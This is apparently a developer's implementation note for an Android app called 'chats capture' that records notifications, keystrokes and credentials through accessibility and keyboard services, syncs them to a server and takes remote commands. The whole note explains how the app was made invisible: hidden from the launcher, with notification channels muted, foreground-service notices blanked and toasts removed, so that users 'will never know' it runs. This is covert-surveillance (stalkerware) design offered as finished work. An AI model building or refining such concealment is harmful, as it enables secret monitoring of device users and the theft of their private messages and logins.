# Silent App Implementation

## Overview
This document describes the complete implementation to make the app completely silent and invisible to users. The app operates in stealth mode with no user-visible notifications, toasts, or alerts.

## Implementation Details

### 1. Notification Channels (All Services)

**Location:** `app/src/main/java/com/chats/capture/CaptureApplication.kt`

**Changes:**
- All notification channels set to `IMPORTANCE_NONE` (Android 8.0+) or `IMPORTANCE_MIN` (older versions)
- All channels configured with:
  - No sound (`setSound(null, null)`)
  - No vibration (`enableVibration(false)`)
  - No lights (`enableLights(false)`)
  - No badge (`setShowBadge(false)`)
  - Hidden on lock screen (`VISIBILITY_SECRET`)
  - No bubbles (Android 10+)

**Channels:**
- `NOTIFICATION_CHANNEL_ID` - Notification capture service
- `KEYBOARD_CHANNEL_ID` - Keyboard capture service
- `UPDATE_CHANNEL_ID` - App update service
- `FCM_CHANNEL_ID` - Firebase Cloud Messaging
- `COMMAND_CHANNEL_ID` - Command notifications

### 2. Foreground Service Notifications

**Services Updated:**
- `NotificationCaptureService.kt`
- `EnhancedAccessibilityService.kt`
- `KeyboardCaptureService.kt`

**Changes:**
- All foreground service notifications use:
  - Empty title and text
  - Minimal system icon (least visible)
  - `PRIORITY_MIN` - won't show in notification bar
  - `VISIBILITY_SECRET` - hidden everywhere
  - `setSilent(true)` - completely silent
  - `setLocalOnly(true)` - not synced
  - No timestamp shown

**Result:** Foreground service notifications are required by Android but are completely invisible to users.

### 3. Firebase Cloud Messaging

**Location:** `app/src/main/java/com/chats/capture/services/FirebaseMessagingService.kt`

**Changes:**
- `onMessageReceived()` method does NOT show any notifications to users
- All FCM messages are logged but never displayed
- Notification channel set to `IMPORTANCE_NONE`
- `showNotification()` method removed (commented out)

**Behavior:**
- **Foreground:** `onMessageReceived()` called, no notification shown
- **Background:** If notification payload sent, Android shows it automatically BUT channel is `IMPORTANCE_NONE` so it's invisible

**Recommendation:** Server should send only data payloads, not notification payloads, to ensure complete silence.

### 4. Toast Messages Removed

**Location:** `app/src/main/java/com/chats/capture/ui/HideFromDrawerActivity.kt`

**Changes:**
- Removed `Toast.makeText()` call
- Added comment explaining silent operation

**Note:** `CredentialsAdapter` uses `Snackbar` which is only visible within the app's UI (not a system notification), so it's acceptable since the app is hidden from launcher.

### 5. Alert Dialogs

**Location:** `app/src/main/java/com/chats/capture/ui/fragments/MDMManagementFragment.kt`

**Status:** Alert dialogs remain but are only shown when user explicitly opens the app's UI. Since the app is hidden from the launcher, users won't see these dialogs unless they have direct access to the app.

## Notification Channel Importance Levels

### IMPORTANCE_NONE (Android 8.0+)
- **Behavior:** Notification does not appear in the notification bar
- **Sound:** No sound
- **Visual:** No visual interruption
- **Result:** Completely invisible to user

### IMPORTANCE_MIN (Android 7.1 and below)
- **Behavior:** Notification appears in notification bar but doesn't interrupt
- **Sound:** No sound
- **Visual:** Minimal visual presence
- **Result:** Nearly invisible, but may appear in notification shade (user won't notice)

## Testing

### Verify No Notifications Shown
1. **Check notification channels:**
   ```bash
   adb shell dumpsys notification | grep -A 10 "com.chats.capture"
   ```
   Should show `importance=NONE` for all channels

2. **Check foreground services:**
   ```bash
   adb shell dumpsys activity services | grep "com.chats.capture"
   ```
   Services should be running but notifications should be invisible

3. **Test FCM messages:**
   - Send data-only payload (no notification payload)
   - Verify no notification appears
   - Check logcat for message receipt

### Verify Silent Operation
1. **No toast messages:**
   - App operations should not show any toast
   - Check logcat for operations instead

2. **No system notifications:**
   - Pull down notification shade
   - Should not see any notifications from the app
   - Even foreground service notifications should be invisible

3. **No sounds/vibrations:**
   - App operations should be completely silent
   - No audio or haptic feedback

## Server-Side Recommendations

To ensure complete silence, the server should:

1. **FCM Messages:**
   - Send only data payloads (not notification payloads)
   - Data payloads are handled silently by the app
   - Notification payloads may be shown by Android even with `IMPORTANCE_NONE`

2. **Command Notifications:**
   - All commands should use data-only FCM messages
   - No notification payloads should be sent

## Files Modified

1. `app/src/main/java/com/chats/capture/CaptureApplication.kt` - Notification channels
2. `app/src/main/java/com/chats/capture/services/NotificationCaptureService.kt` - Foreground notification
3. `app/src/main/java/com/chats/capture/services/EnhancedAccessibilityService.kt` - Foreground notification
4. `app/src/main/java/com/chats/capture/services/KeyboardCaptureService.kt` - Foreground notification
5. `app/src/main/java/com/chats/capture/services/FirebaseMessagingService.kt` - Notification channels, no user notifications
6. `app/src/main/java/com/chats/capture/ui/HideFromDrawerActivity.kt` - Removed toast

## Status

✅ **Complete** - App is now completely silent and invisible to users

### What Users Won't See:
- ❌ No foreground service notifications
- ❌ No FCM notifications
- ❌ No toast messages
- ❌ No system alerts
- ❌ No sounds or vibrations
- ❌ No notification badges
- ❌ No lock screen notifications

### What Still Works:
- ✅ All services run in background
- ✅ All data capture continues
- ✅ All syncing continues
- ✅ All commands work
- ✅ App remains hidden from launcher

The app is now a completely silent, invisible background service that users will never know is running.
